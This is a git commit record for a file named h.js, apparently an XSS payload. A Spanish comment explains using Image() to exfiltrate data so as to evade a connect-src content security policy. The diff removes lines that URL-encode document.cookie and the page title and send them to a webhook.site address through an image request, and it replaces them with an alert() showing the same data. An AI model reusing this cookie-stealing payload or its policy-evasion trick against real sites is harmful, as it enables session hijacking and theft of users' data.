9095ce32fcebd13232388042279ab3ecfdbdc3e2
Hynpbus <iancruzh@gmail.com>
2026-03-27 21:34:59 -0400

    ???

--- h.js
+++ h.js
@@ -1,5 +1,2 @@
 // Usar Image() para exfiltrar - no usa connect-src
-var data = encodeURIComponent(document.cookie + '|||' + document.title);
-var img = new Image();
-img.src = 'https://webhook.site/83c9e8c3-384e-4bea-a583-b1b1de596d17?c=' + data;
-document.body.appendChild(img);
+alert(document.cookie + '|||' + document.title);
